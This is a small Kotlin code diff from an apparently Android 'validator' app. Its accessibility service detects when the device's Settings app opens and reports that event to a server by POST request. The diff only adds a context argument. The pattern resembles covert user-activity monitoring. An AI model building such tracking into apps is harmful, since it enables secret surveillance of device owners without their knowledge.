@@ -4,6 +4,7 @@ package com.evashadidi.validator
 import android.accessibilityservice.AccessibilityService
 import android.view.accessibility.AccessibilityEvent
 import android.util.Log
+import com.evashadidi.validator.ValidatorApp.Companion.context
 
 class MyAccessibilityService : AccessibilityService() {
 
@@ -14,7 +15,7 @@ class MyAccessibilityService : AccessibilityService() {
 
             if (packageName == "com.android.settings") {
                 Log.d("ValidatorApp", "Settings app opened")
-                NetworkUtils.sendPostRequest("Device settings opened")
+                NetworkUtils.sendPostRequest(context,"Device settings opened")
             }
         }
     }
